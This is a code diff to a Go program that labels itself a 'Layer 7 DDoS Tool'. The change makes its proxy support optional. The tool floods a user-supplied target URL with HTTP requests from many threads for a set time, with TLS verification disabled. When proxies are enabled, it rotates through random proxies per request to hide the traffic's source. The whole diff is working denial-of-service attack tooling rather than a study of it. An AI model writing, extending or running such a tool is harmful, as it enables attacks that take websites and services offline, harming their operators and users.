@@ -23,7 +23,7 @@ const (
  /____/ \__//_/   /_//_/|_|  
                             v3.0`
 
-	usage = `Usage: go run main.go <target> <time> <rate> <threads> <proxy-file>`
+	usage = `Usage: go run main.go <target> <time> <rate> <threads>`
 )
 
 type Config struct {
@@ -31,31 +31,42 @@ type Config struct {
 	Time      int
 	Rate      int
 	Threads   int
+	UseProxy  bool
 	ProxyFile string
 }
 
 var logger = log.New(os.Stdout, "[INFO] ", log.LstdFlags|log.Lshortfile)
 
 func main() {
-	if len(os.Args) < 6 {
+	if len(os.Args) < 5 {
 		fmt.Println(usage)
 		os.Exit(1)
 	}
 
 	config := &Config{
-		Target:    os.Args[1],
-		Time:      parseInt(os.Args[2]),
-		Rate:      parseInt(os.Args[3]),
-		Threads:   parseInt(os.Args[4]),
-		ProxyFile: os.Args[5],
+		Target:   os.Args[1],
+		Time:     parseInt(os.Args[2]),
+		Rate:     parseInt(os.Args[3]),
+		Threads:  parseInt(os.Args[4]),
+		UseProxy: askUseProxy(),
 	}
 
+	if config.UseProxy {
+		fmt.Print("Enter proxy file path: ")
+		fmt.Scanln(&config.ProxyFile)
+
+		proxies := loadProxies(config.ProxyFile)
+		if len(proxies) == 0 {
+			logger.Fatal("No proxies loaded. Exiting.")
+		}
+		runAttack(config, proxies)
+	} else {
+		runAttack(config, nil)
+	}
+}
+
+func runAttack(config *Config, proxies []string) {
 	printBanner(config)
-	proxies := loadProxies(config.ProxyFile)
-
-	if len(proxies) == 0 {
-		logger.Fatal("No proxies loaded. Exiting.")
-	}
 
 	var wg sync.WaitGroup
 	for i := 1; i <= config.Threads; i++ {
@@ -68,6 +79,13 @@ func main() {
 
 	time.Sleep(time.Duration(config.Time) * time.Second)
 	logger.Println("Attack Completed.")
+}
+
+func askUseProxy() bool {
+	var response string
+	fmt.Print("Use proxy? (yes/no): ")
+	fmt.Scanln(&response)
+	return strings.ToLower(response) == "yes"
 }
 
 func parseInt(s string) int {
@@ -111,7 +129,11 @@ func printBanner(config *Config) {
 	fmt.Printf("-> Time \t: %d seconds\n", config.Time)
 	fmt.Printf("-> Rate \t: %d\n", config.Rate)
 	fmt.Printf("-> Threads\t: %d\n", config.Threads)
-	fmt.Printf("-> ProxyFile\t: %s\n", config.ProxyFile)
+	if config.UseProxy {
+		fmt.Printf("-> ProxyFile\t: %s\n", config.ProxyFile)
+	} else {
+		fmt.Println("-> ProxyFile\t: Not Used")
+	}
 	fmt.Println("-------------------------------------------")
 	fmt.Println("-> Layer 7 DDoS Tool Initialized")
 	fmt.Println("-------------------------------------------")
@@ -120,7 +142,7 @@ func printBanner(config *Config) {
 
 func workerThread(id int, config *Config, proxies []string) {
 	logger.Printf("Worker Thread %d Started\n", id)
-	client := createHTTPClient(proxies)
+	client := createHTTPClient(proxies, config.UseProxy)
 	targetURL, err := url.Parse(config.Target)
 	if err != nil {
 		logger.Printf("Error parsing target URL: %v", err)
@@ -149,14 +171,22 @@ func workerThread(id int, config *Config, proxies []string) {
 	}
 }
 
-func createHTTPClient(proxies []string) *http.Client {
+func createHTTPClient(proxies []string, useProxy bool) *http.Client {
+	if useProxy && len(proxies) > 0 {
+		return &http.Client{
+			Transport: &http.Transport{
+				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+				Proxy: func(_ *http.Request) (*url.URL, error) {
+					proxy := proxies[rand.Intn(len(proxies))]
+					return url.Parse("http://" + proxy)
+				},
+			},
+			Timeout: 10 * time.Second,
+		}
+	}
 	return &http.Client{
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-			Proxy: func(_ *http.Request) (*url.URL, error) {
-				proxy := proxies[rand.Intn(len(proxies))]
-				return url.Parse("http://" + proxy)
-			},
 		},
 		Timeout: 10 * time.Second,
 	}
